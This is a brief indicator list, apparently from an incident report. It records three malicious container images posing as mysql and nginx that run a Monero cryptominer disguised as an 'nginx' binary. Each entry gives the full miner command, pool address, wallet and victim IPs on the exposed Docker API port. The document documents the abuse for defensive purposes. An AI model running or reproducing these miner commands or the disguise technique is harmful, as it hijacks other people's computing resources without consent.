Image: docker.io/gakeaws/mysql:5.6
        Command: nginx -a cryptonight -o stratum+tcp://pool.supportxmr.com:5555 -k --donate-level 1 --cpu-priority 0 -u 45TwKEr1LjoEPuxnbfuPhaXCf138AoQvtSJ3jdqg1gPxNjkSNbQpzZrGDaFHGLrVT7AzM7tU9QY8NVdr4H1C3r2d3XN9Cty -p 0913_2_47.99.242.11_2375 -t 2

        Image: docker.io/gakeaws/mysql:5.6
      	Command: nginx -a cryptonight -o stratum+tcp://pool.supportxmr.com:5555 -k --donate-level 1 --cpu-priority 0 -u 45TwKEr1LjoEPuxnbfuPhaXCf138AoQvtSJ3jdqg1gPxNjkSNbQpzZrGDaFHGLrVT7AzM7tU9QY8NVdr4H1C3r2d3XN9Cty -p 0913_1_39.97.178.119_2375 -t 1

      	Image: docker.io/gakeaws/nginx:v8.9
      	Command: nginx -a cryptonight -o stratum+tcp://pool.supportxmr.com:5555 -k --donate-level 1 --cpu-priority 0 -u 45TwKEr1LjoEPuxnbfuPhaXCf138AoQvtSJ3jdqg1gPxNjkSNbQpzZrGDaFHGLrVT7AzM7tU9QY8NVdr4H1C3r2d3XN9Cty -p 0910_1_39.97.178.119_2375 -t 1

nginx is the xmr mining executable.

/usr/bin/nginx in the image.
